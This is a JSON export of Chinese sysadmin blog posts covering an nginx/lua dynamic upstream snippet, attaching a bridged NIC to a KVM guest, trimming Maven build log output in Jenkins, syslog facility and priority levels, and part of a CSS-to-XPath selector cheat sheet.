class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e    \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_buffering             off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header            Host \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header            X-Forwarded-For \u003cspan class=\"nv\"\u003e$proxy_add_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_redirect              off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_connect_timeout       10\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_send_timeout          30\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_read_timeout          30\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_pass                  http://\u003cspan class=\"nv\"\u003e$upstream\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e送进redis一些数据\u003c/p\u003e","title":"lua与redis结合应用于nginx的动态upstream"},{"content":"比较古怪的需求，公司拉了根专线到机房。\n而使用专线的机器是一台kvm虚机，实体机有自己的路由，实体机的前两个网卡做了双网卡bonding。\n那虚机就只能使用实机的第三块网卡连出去了，而且必须制定host的路由，这里给的子网掩码是255.255.255.252，只有2个ip可以用，所以只能虚机有ip，实机根本不能配ip地址！！！\n首先把实机dell r720的第三块网卡em3改一下，连接到网桥br1\ncat /etc/sysconfig/network-scripts/ifcfg-em3 DEVICE=em3 HWADDR=XX:XX:XX:XX:XX:XX TYPE=Ethernet UUID=6b68220d-d5ed-496f-b8d1-4c6d9cbb1234 ONBOOT=yes NM_CONTROLLED=no BRIDGE=br1 再做个网桥br1\ncat /etc/sysconfig/network-scripts/ifcfg-br1 DEVICE=br1 BOOTPROTO=none ONBOOT=yes TYPE=Bridge 注意，这个物理机网卡和网桥都没有IP地址，实在是可怜，ip不够用\n然后启动他们：\nifup em3 ifup br1 虚机挂接新设备：\nvirsh attach-interface --domain vis-16-13-28 \\ --type bridge \\ --source br1 --model virtio \\ --mac f0:00:ac:30:2d:1d --config 然后ssh登录虚机，配置好虚机中eth1的ip/mask，不要配gateway啊\n最后直接加主机路由：\nroute add -host 172.17.11.182 dev eth1 ping一下对端172.17.11.182，通就搞定了。\n","permalink":"https://rendoumi.com/posts/20240123-kvm_netcard_attach/","summary":"\u003cp\u003e比较古怪的需求，公司拉了根专线到机房。\u003c/p\u003e\n\u003cp\u003e而使用专线的机器是一台kvm虚机，实体机有自己的路由，实体机的前两个网卡做了双网卡bonding。\u003c/p\u003e\n\u003cp\u003e那虚机就只能使用实机的第三块网卡连出去了，而且必须制定host的路由，这里给的子网掩码是255.255.255.252，只有2个ip可以用，所以只能虚机有ip，实机根本不能配ip地址！！！\u003c/p\u003e\n\u003cp\u003e首先把实机dell r720的第三块网卡em3改一下，连接到网桥br1\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/sysconfig/network-scripts/ifcfg-em3  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eem3  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eHWADDR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eXX:XX:XX:XX:XX:XX  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eEthernet  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e6b68220d-d5ed-496f-b8d1-4c6d9cbb1234  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNM_CONTROLLED\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBRIDGE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e再做个网桥br1\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/sysconfig/network-scripts/ifcfg-br1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBOOTPROTO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enone  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eBridge  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，这个物理机网卡和网桥都没有\u003ccode\u003eIP\u003c/code\u003e地址，实在是可怜，ip不够用\u003c/p\u003e\n\u003cp\u003e然后启动他们：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifup em3  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifup br1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e虚机挂接新设备：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh attach-interface --domain vis-16-13-28 \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        --type bridge \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e        --source br1 --model virtio \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e        --mac f0:00:ac:30:2d:1d --config\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后ssh登录虚机，配置好虚机中eth1的ip/mask，不要配gateway啊\u003c/p\u003e\n\u003cp\u003e最后直接加主机路由：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroute add -host 172.17.11.182 dev eth1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eping一下对端172.17.11.182，通就搞定了。\u003c/p\u003e","title":"kvm的虚机中如何在线挂接一块新网卡"},{"content":"最近在弄jenkins的自动打包部署\n出现个问题，项目是用的mvn，打包的时候，如果是在控制台下还好。\n如果是在jenkins下，看console output，往中心仓库artifactory提交包的时候，会显示下面一堆：\nUploaded: http://xxx:8081/artifactory/libs-release-local/abc/maven-metadata.xml (315 B at 17.1 KB/sec) Uploading: http://xxx:8081/artifactory/libs-release-local/abc/d/admin-9.1.war 20000/21969 KB 20002/21969 KB 20004/21969 KB 20006/21969 KB 20008/21969 KB 20010/21969 KB 20012/21969 KB 20014/21969 KB 20016/21969 KB 20018/21969 KB 20020/21969 KB 20022/21969 KB 20024/21969 KB 20026/21969 KB 20028/21969 KB 20030/21969 KB 20032/21969 KB 20034/21969 KB 20036/21969 KB 20038/21969 KB 20040/21969 KB 20042/21969 KB 20044/21969 KB ...... 长度无比长，垃圾东西。如何将之屏蔽呢？\n首先去修改mvn的日志级别，缺省是INFO，提高到WARN：\nMAVEN_OPTS=-Dorg.slf4j.simpleLogger.defaultLogLevel=warn mvn -ff clean install 我去，INFO是都没了，但是这个居然还在！！！！\n查了下java的日志优先级：\nALL \u0026lt; DEBUG \u0026lt; INFO \u0026lt; WARN \u0026lt; ERROR \u0026lt; FATAL \u0026lt; OFF 上面只有FATAL和OFF了，说明这个是个副产品，不是mvn控制的，而是上传的时候产生的。\n没办法了，祭出shell大法：\nmvn -ff clean install | egrep \u0026#34;(^\\[INFO\\])\u0026#34; 把开头是[INFO]的显示出来，如果不够，还可以加上[DEBUG]\nmvn -ff clean install | egrep \u0026#34;(^\\[INFO\\]|^\\[DEBUG\\])\u0026#34; 如果要取反，不显示以[INFO]和[DEBUG]打头的那些行：\nmvn -ff clean install | egrep -v \u0026#34;(^\\[INFO\\]|^\\[DEBUG\\])\u0026#34; 最后，mvn全静默，只有出错才显示的方式：\nmvn -ff -q clean install 这下世界都安静了。\n再说一下 mvn build 参数的调试：\nmvn的parent pom里面指定了local file repo\n\u0026lt;repositories\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;project.local\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;project\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;file://${project.basedir}/../repo\u0026lt;/url\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;/repositories\u0026gt; 而且指定了-s setting.xml，里面也有artifactory的repos. 在子模块module里不知道是否正常获得了。\n执行下面命令就可以了：\nmvn help:evaluate ${project.repositories} ","permalink":"https://rendoumi.com/posts/20240123-mvn_build_log/","summary":"\u003cp\u003e最近在弄jenkins的自动打包部署\u003c/p\u003e\n\u003cp\u003e出现个问题，项目是用的mvn，打包的时候，如果是在控制台下还好。\u003c/p\u003e\n\u003cp\u003e如果是在jenkins下，看console output，往中心仓库artifactory提交包的时候，会显示下面一堆：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUploaded: http://xxx:8081/artifactory/libs-release-local/abc/maven-metadata.xml \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e315\u003c/span\u003e B at 17.1 KB/sec\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUploading: http://xxx:8081/artifactory/libs-release-local/abc/d/admin-9.1.war  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20000/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20002/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20004/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20006/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20008/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20010/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20012/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20014/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20016/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20018/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20020/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20022/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20024/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20026/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20028/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20030/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20032/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20034/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20036/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20038/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20040/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20042/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e20044/21969 KB  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e长度无比长，垃圾东西。如何将之屏蔽呢？\u003c/p\u003e\n\u003cp\u003e首先去修改mvn的日志级别，缺省是INFO，提高到WARN：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eMAVEN_OPTS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-Dorg.slf4j.simpleLogger.defaultLogLevel\u003cspan class=\"o\"\u003e=\u003c/span\u003ewarn mvn -ff  clean install  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我去，INFO是都没了，但是这个居然还在！！！！\u003c/p\u003e\n\u003cp\u003e查了下java的日志优先级：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eALL \u0026lt; DEBUG \u0026lt; INFO \u0026lt; WARN \u0026lt; ERROR \u0026lt; FATAL \u0026lt; OFF  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上面只有FATAL和OFF了，说明这个是个副产品，不是mvn控制的，而是上传的时候产生的。\u003c/p\u003e","title":"mvn build的时候控制日志输出"},{"content":"首先是：\n[facility].[priority]\nfacility表示设备、设施，特别装置：\nauth # 认证相关的 authpriv # 权限,授权相关的 cron # 任务计划相关的 daemon # 守护进程相关的 kern # 内核相关的 lpr # 打印相关的 mail # 邮件相关的 mark # 标记相关的 news # 新闻相关的 security # 安全相关的,与auth 类似 syslog # syslog自己的 user # 用户相关的 uucp # unix to unix cp 相关的 local0 到 local7 # 用户自定义使用 * # *表示所有的facility 一定要注意上面的，local0 到 local7 # 用户自定义使用\npriority表示优先权，日志优先权(log level),一般有以下几种优先权(从低到高)：\ndebug # 程序或系统的调试信息 info # 一般信息, notice # 不影响正常功能,需要注意的消息 warning/warn # 可能影响系统功能,需要提醒用户的重要事件 err/error # 错误信息 crit # 比较严重的 alert # 必须马上处理的 emerg/oanic # 会导致系统不可用的 * # 表示所有的日志级别 none # 跟* 相反,表示啥也没有 syslog的日志优先权默认是info，这时候用syslog为debug(最低日志优先权)来写日志，syslog服务是不会写入日志的。\n","permalink":"https://rendoumi.com/posts/20240123-syslog_priority/","summary":"\u003cp\u003e首先是：\u003c/p\u003e\n\u003cp\u003e[facility].[priority]\u003c/p\u003e\n\u003cp\u003efacility表示设备、设施，特别装置：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth      \u003cspan class=\"c1\"\u003e# 认证相关的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauthpriv  \u003cspan class=\"c1\"\u003e# 权限,授权相关的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecron      \u003cspan class=\"c1\"\u003e# 任务计划相关的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edaemon    \u003cspan class=\"c1\"\u003e# 守护进程相关的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekern      \u003cspan class=\"c1\"\u003e# 内核相关的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elpr       \u003cspan class=\"c1\"\u003e# 打印相关的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003email      \u003cspan class=\"c1\"\u003e# 邮件相关的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emark      \u003cspan class=\"c1\"\u003e# 标记相关的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enews      \u003cspan class=\"c1\"\u003e# 新闻相关的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esecurity  \u003cspan class=\"c1\"\u003e# 安全相关的,与auth 类似  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esyslog    \u003cspan class=\"c1\"\u003e# syslog自己的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euser      \u003cspan class=\"c1\"\u003e# 用户相关的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euucp      \u003cspan class=\"c1\"\u003e# unix to unix cp 相关的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocal0 到 local7 \u003cspan class=\"c1\"\u003e# 用户自定义使用  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e*         \u003cspan class=\"c1\"\u003e# *表示所有的facility\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e一定要注意上面的，\u003cstrong\u003elocal0 到 local7 # 用户自定义使用\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003epriority表示优先权，日志优先权(log level),一般有以下几种优先权(从低到高)：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edebug           \u003cspan class=\"c1\"\u003e# 程序或系统的调试信息  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einfo            \u003cspan class=\"c1\"\u003e# 一般信息,  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enotice          \u003cspan class=\"c1\"\u003e# 不影响正常功能,需要注意的消息  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewarning/warn    \u003cspan class=\"c1\"\u003e# 可能影响系统功能,需要提醒用户的重要事件  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eerr/error       \u003cspan class=\"c1\"\u003e# 错误信息  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecrit            \u003cspan class=\"c1\"\u003e# 比较严重的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ealert           \u003cspan class=\"c1\"\u003e# 必须马上处理的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eemerg/oanic     \u003cspan class=\"c1\"\u003e# 会导致系统不可用的  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e*               \u003cspan class=\"c1\"\u003e# 表示所有的日志级别\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enone            \u003cspan class=\"c1\"\u003e# 跟* 相反,表示啥也没有  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003esyslog的日志优先权默认是info，这时候用syslog为debug(最低日志优先权)来写日志，syslog服务是不会写入日志的。\u003c/p\u003e","title":"syslog级别详解"},{"content":"最近在搞puppeteer的自动化，有很多地方需要用到CSS Selector，但是某些地方又是用Xpath方便，金手指放一下，备查：\nTest queries in the Xpath test bed: Xpath test bed (whitebeam.org) Browser console $x(\u0026#34;//div\u0026#34;) Works in Firefox and Chrome.\n#Selectors Descendant selectors h1 //h1 div p `//div//p ul \u0026gt; li `//ul/li ul \u0026gt; li \u0026gt; a //ul/li/a div \u0026gt; * //div/* :root `/ :root \u0026gt; body /body Attribute selectors #id //*[@id=\u0026quot;id\u0026quot;] .class //*[@class=\u0026quot;class\u0026quot;] …kinda input[type=\u0026quot;submit\u0026quot;] //input[@type=\u0026quot;submit\u0026quot;] a#abc[for=\u0026quot;xyz\u0026quot;] `//a[@id=\u0026ldquo;abc\u0026rdquo;][@for=\u0026ldquo;xyz\u0026rdquo;] a[rel] //a[@rel] a[href^='/'] `//a[starts-with(@href, \u0026lsquo;/\u0026rsquo;)] a[href$='pdf'] //a[ends-with(@href, '.pdf')] a[href*='://'] //a[contains(@href, '://')] a[rel~='help'] //a[contains(@rel, 'help')] …kinda Order selectors ul \u0026gt; li:first-of-type `//ul/li[1] ul \u0026gt; li:nth-of-type(2) //ul/li[2] ul \u0026gt; li:last-of-type //ul/li[last()] li#id:first-of-type `//li[1][@id=\u0026ldquo;id\u0026rdquo;] a:first-child //*[1][name()=\u0026quot;a\u0026quot;] a:last-child //*[last()][name()=\u0026quot;a\u0026quot;] Siblings h1 ~ ul `//h1/following-sibling::ul h1 + ul //h1/following-sibling::ul[1] h1 ~ #id //h1/following-sibling::[@id=\u0026quot;id\u0026quot;] jQuery $('ul \u0026gt; li').parent() `//ul/li/.. $('li').closest('section') //li/ancestor-or-self::section $('a').attr('href') `//a/@href $('span').text() //span/text() Other things h1:not([id]) `//h1[not(@id)] Text match `//button[text()=\u0026ldquo;Submit\u0026rdquo;] Text match (substring) //button[contains(text(),\u0026quot;Go\u0026quot;)] Arithmetic //product[@price \u0026gt; 2.50] Has children //ul[*] Has children (specific) //ul[li] Or logic `//a[@name or @href] Union (joins results) `//a | //div Class check //div[contains(concat(\u0026#39; \u0026#39;,normalize-space(@class),\u0026#39; \u0026#39;),\u0026#39; foobar \u0026#39;)] Xpath doesn’t have the “check if part of space-separated list” operator, so this is the workaround (source).\n#Expressions Steps and axes // ul / a[@id='link'] Axis Step Axis Step Prefixes Prefix Example What // //hr[@class='edge'] Anywhere ./ ./a Relative / /html/body/div Root Begin your expression with any of these.\nAxes Axis Example What / //ul/li/a Child // //[@id=\u0026quot;list\u0026quot;]//a Descendant Separate your steps with /. Use two (//) if you don’t want to select direct children.\nSteps //div //div[@name=\u0026#39;box\u0026#39;] //[@id=\u0026#39;link\u0026#39;] A step may have an element name (div) and predicates ([...]). Both are optional. They can also be these other things:\n//a/text() #=\u0026gt; \u0026#34;Go home\u0026#34; //a/@href #=\u0026gt; \u0026#34;index.html\u0026#34; //a/* #=\u0026gt; All a\u0026#39;s child elements #Predicates Predicates //div[true()] //div[@class=\u0026#34;head\u0026#34;] //div[@class=\u0026#34;head\u0026#34;][@id=\u0026#34;top\u0026#34;] Restricts a nodeset only if some condition is true. They can be chained.\nOperators # Comparison //a[@id = \u0026#34;xyz\u0026#34;] //a[@id != \u0026#34;xyz\u0026#34;] //a[@price \u0026gt; 25] # Logic (and/or) //div[@id=\u0026#34;head\u0026#34; and position()=2] //div[(x and y) or not(z)] Use comparison and logic operators to make conditionals.\nUsing nodes # Use them inside functions //ul[count(li) \u0026gt; 2] //ul[count(li[@class=\u0026#39;hide\u0026#39;]) \u0026gt; 0] # This returns `\u0026lt;ul\u0026gt;` that has a `\u0026lt;li\u0026gt;` child //ul[li] You can use nodes inside predicates.\nIndexing //a[1] # first 